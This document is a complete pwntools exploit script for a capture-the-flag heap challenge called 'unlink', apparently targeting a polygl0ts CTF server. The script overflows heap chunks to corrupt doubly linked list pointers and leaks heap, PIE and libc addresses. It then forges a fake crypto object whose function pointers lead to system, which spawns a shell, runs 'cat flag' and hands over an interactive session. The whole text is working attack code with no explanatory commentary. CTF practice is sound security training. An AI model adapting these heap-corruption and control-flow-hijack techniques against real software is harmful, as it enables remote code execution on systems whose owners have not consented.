from pwn import *
import time

class chunk:
    def __init__(self, session_id, addr, nextt, prevv):
        self.session_id = session_id
        self.addr = addr
        self.nextt = nextt
        self.prevv = prevv
        self.nextt_clobbered = False
        self.prevv_clobbered = False

HEAD_NEXT_ADDR = 0x1234
head_next = HEAD_NEXT_ADDR
head_prev = HEAD_NEXT_ADDR
heap_base = 0x0
curr_base = heap_base
chunk_size = 0x140
free_chunks = []
chunks = {}

def find_chunk(addr):
    for _, c in chunks.items():
        if c.addr == addr: return c
    return None

def add_chunk(session_id, challenge):
    global curr_base, head_prev, head_next, chunks
    if len(free_chunks) > 0:
        new_addr = free_chunks.pop()
    else:
        new_addr = curr_base
        curr_base += chunk_size 
    nextt = HEAD_NEXT_ADDR
    prevv = head_prev
    if prevv == HEAD_NEXT_ADDR:
        head_next = new_addr  
    else:
        prevv_chunk = find_chunk(prevv)
        if prevv_chunk is None: breakpoint()
        prevv_chunk.nextt = new_addr
    head_prev = new_addr
    chunks[session_id] = chunk(session_id, new_addr, nextt, prevv)
    if len(challenge) > 0x120:
        i = 1
        overflow_size = len(challenge) - 0x120
        ov_bytes = challenge[0x120:]
        while(overflow_size >= 0):     
            victim = find_chunk(new_addr + i*chunk_size)
            if victim is not None:
                next_ov = ov_bytes[:8]
                if next_ov == p64(victim.nextt)[:len(next_ov)]:
                    print(f"fixing victim: {hex(victim.nextt)}")
                    victim.nextt_clobbered = False
                else: 
                    victim.nextt_clobbered = True
                if(overflow_size) > 8:
                    prev_ov = ov_bytes[8:16]
                    if prev_ov == p64(victim.prevv)[:len(prev_ov)]:
                        victim.prevv_clobbered = False
                    else: 
                        victim.prevv_clobbered = True  
            overflow_size -= 0x140
            i += 1

def remove_chunk(session_id):
    if session_id == 0: return
    global curr_base, head_prev, head_next, chunks
    if session_id not in chunks:
        return
    c = chunks[session_id]
    del chunks[session_id]
    if c.prevv == HEAD_NEXT_ADDR:
        assert not c.nextt_clobbered, "fucked the linked list head"
    if c.nextt == HEAD_NEXT_ADDR:
        assert not c.prevv_clobbered, "fucked the linked list head"
    nextt_c = find_chunk(c.nextt)
    prevv_c = find_chunk(c.prevv)
    if nextt_c is not None and prevv_c is not None:
        prevv_c.nextt = nextt_c.addr 
        nextt_c.prevv = prevv_c.addr
        if c.nextt_clobbered or c.prevv_clobbered:
            prevv_c.nextt_clobbered = True 
            nextt_c.prevv_clobbered = True
        if not c.nextt_clobbered and not c.prevv_clobbered:
            nextt_c.prevv_clobbered = False
            prevv_c.nextt_clobbered = False
    elif nextt_c is None and prevv_c is not None:
        prevv_c.nextt = HEAD_NEXT_ADDR 
        head_prev = prevv_c.addr
    elif nextt_c is not None and prevv_c is None:
        nextt_c.prevv = HEAD_NEXT_ADDR
        head_next = nextt_c.addr 
    else:
        head_next = HEAD_NEXT_ADDR
        head_prev = HEAD_NEXT_ADDR 
     
    free_chunks.append(c.addr)

def print_ll():
    print("linked list:")
    curr = find_chunk(head_next)
    while(curr != HEAD_NEXT_ADDR and curr is not None):
        print(f'[{hex(curr.addr)}] {hex(curr.nextt)},{hex(curr.prevv)} | {curr.nextt_clobbered},{curr.prevv_clobbered}')
        curr = find_chunk(curr.nextt)

def reset_ll(r, max_chunks=10):
    nr_free = len(free_chunks)
    for i in range(0, nr_free):
        create(r, b"\x00"*0x100)
    sorted_sessions = [x[0] for x in sorted(chunks.items(), key=lambda x: x[1].addr, reverse=True) ]
    print(len(sorted_sessions))
    for s in sorted_sessions[:max_chunks]:
        unlink(r, s)
    for _ in range(0, len(sorted_sessions[:max_chunks])):
        create(r, b"\x00"*0x100) 

def create(r, challenge):
    r.sendline(b"1")
    r.sendlineafter(b"size?", str(len(challenge)).encode())
    r.sendafter(b"data?", challenge)
    l = r.recvline()
    l = r.recvline()
    session_id = int(l.split(b":")[-1])
    add_chunk(session_id, challenge)
    r.recvuntil(b"with the thing")
    return session_id

def unlink(r, session_id, nowait=False):
    remove_chunk(session_id)
    r.sendline(b"2")
    r.sendlineafter(b"session id?", str(session_id).encode())
    if nowait: return
    r.recvuntil(b"=============================\n")
    chall = r.recvuntil(b"=============================")
    r.recvuntil(b"with the thing")
    return chall

if args["DOCKER"]:
    r = remote("127.0.0.1", 6666)
elif args["REMOTE"]:
    r = remote("chall.polygl0ts.ch", 6666)
else:
    r = process("./unlink")

sessions = []
for i in range(0, 7):
    sessions.append(create(r, b"A"*0x100))
    print_ll()

unlink(r, sessions[3])
unlink(r, sessions[4])
sessions[4] = create(r, b"A" *0x100)
sessions[3] = create(r, b"A" *0x100)
sessions.append(create(r, b"A" * 0x100))
unlink(r, sessions[3])
sessions[3] = create(r, b"A" * 0x120 + b"\x08")
unlink(r, sessions[5])
unlink(r, sessions[4])
leak = unlink(r, sessions[6])
heap_leak = int.from_bytes(leak[0x70:0x78], "little")
print(f'heap leak: {hex(heap_leak)}')
heap = heap_leak - 0x780
for s, c in chunks.items():
    c.addr += heap
    if c.nextt != HEAD_NEXT_ADDR: 
        c.nextt += heap
    if c.prevv != HEAD_NEXT_ADDR:
        c.prevv += heap
for i, c in enumerate(free_chunks):
    free_chunks[i] += heap
curr_base += heap
heap_base = heap
if head_next != HEAD_NEXT_ADDR:
    head_next += heap
if head_prev != HEAD_NEXT_ADDR:
    head_prev += heap
print_ll()
unlink(r, sessions[1])
sessions[1] = create(r, b"A"*0x120 + p64(heap+0x8c0))
unlink(r, sessions[2])

reset_ll(r)
print_ll()

crypto_obj = heap-0x1000
fake_obj = crypto_obj - 0x18
print(f'addr of crypto obj: {hex(crypto_obj)}')

def unlink_into(r, addr, max_chunks=10):
    fixup_ov_c = heap + chunk_size * 3
    clobber_c = heap + chunk_size * 4
    ov_c = heap + chunk_size * 5
    victim_c = heap + chunk_size * 6
    wow = heap + chunk_size * 7

    unlink(r, find_chunk(ov_c).session_id)
    print(hex(fake_obj-0x8))
    create(r, b"A"*0x120 + p64(addr - 0x8))
    unlink(r, find_chunk(victim_c).session_id)
    unlink(r, find_chunk(fixup_ov_c).session_id)
    create(r, b"A"*0x120 + p64(find_chunk(wow).addr))
    unlink(r, find_chunk(clobber_c).session_id)
    reset_ll(r, max_chunks=max_chunks)

    """
    unlink(r, find_chunk(ov_c).session_id)
    print(hex(fake_obj-0x8))
    create(r, b"A"*0x120 + p64(fake_obj))
    unlink(r, find_chunk(victim_c).session_id)
    unlink(r, find_chunk(fixup_ov_c).session_id)
    create(r, b"A"*0x120 + p64(find_chunk(wow).addr))
    unlink(r, find_chunk(clobber_c).session_id)
    
    reset_ll(r)
    print_ll()
    """

unlink_into(r, fake_obj)
unlink_into(r, fake_obj+0x8)
for _ in range(0, 3):
    create(r, b"\x00"*0x100)
print_ll()
# leak shit
ov_1 = heap
ov_2 = heap + chunk_size * 1
victim = heap + chunk_size * 2
unlink(r, find_chunk(heap + chunk_size*4).session_id) # make sure unlink writing doesn't mess with us
unlink(r, find_chunk(ov_2).session_id)
unlink(r, find_chunk(ov_1).session_id)
create(r, b"A" * (0x120+0x140) + p64(fake_obj))
print_ll()
leak = unlink(r, 0)
print(hexdump(leak))
jemalloc_leak = int.from_bytes(leak[0x10:0x18], "little")
pie_leak = int.from_bytes(leak[0:0x8], "little")
print(f'jemalloc leak: {hex(jemalloc_leak)}')
#TODO fix for docker
pie = pie_leak - 0x1747
jemalloc = jemalloc_leak - 0x27000 
libc =  jemalloc - 0x212000 
system = libc + 0x58750
malloc = jemalloc + 0x24370
crpyto_pie = pie + 0x4070
puts = libc + 0x87be0
print(f'libc : {hex(libc)}')
create(r, b"A" * 0x120 + p64(heap + chunk_size*3))
for _ in range(0, 2):
    create(r, b"\x00"*0x100)
print_ll()
reset_ll(r, max_chunks=10)
print_ll()
# forge fake crypto object
fake_crypto = heap + chunk_size * 11
print(f'fake crypto at {hex(fake_crypto+0x20)}')
unlink(r, find_chunk(fake_crypto).session_id)
create(r, b"A" * 0x18 + p64(puts))
unlink_into(r, fake_crypto+0x30)
input("go?")
unlink(r, find_chunk(fake_crypto).session_id)
print(hex(malloc))
create(r, b"A" * 0x10 + p64(malloc))
unlink_into(r, fake_crypto+0x28)
unlink(r, find_chunk(fake_crypto).session_id)
create(r, b"A" * 0x8 + p64(system))
unlink_into(r, fake_crypto+0x20)
unlink(r, find_chunk(fake_crypto).session_id)
# unlink to overwrite crypto object pointer in pie
print(f"setting up crpyto unlink")
victim_c = heap + 9*chunk_size
ov_2 = heap + 8*chunk_size
ov_1 = heap + 7*chunk_size
unlink(r, find_chunk(ov_2).session_id)
unlink(r, find_chunk(ov_1).session_id)
create(r, b"A" * (0x140+0x128) + p64(fake_crypto+0x20))
victim_null_unlink = heap + 6*chunk_size
null_ov_1 = heap + 5*chunk_size
unlink(r, find_chunk(null_ov_1).session_id)
create(r, b"A"*0x120 + p64(victim_c-8))
unlink(r, find_chunk(victim_null_unlink).session_id)
create(r, b"A"*0x100)
create(r, b"A"*0x120 + p64(crpyto_pie-8))
access_fix_ov = heap + 3 * chunk_size
unlink(r, find_chunk(access_fix_ov).session_id)
create(r, b"A"*0x120 + p64(victim_c))
unlink(r, find_chunk(victim_c).session_id)
print_ll()
create(r, b"/bin/sh\x00") # fixup clobbered pointer
create(r, b"/bin/sh\x00") # fixup clobbered pointer
#gdb.attach(r)
unlink(r, find_chunk(heap).session_id, nowait=True)
time.sleep(1)
r.sendline(b"cat flag")
r.interactive()

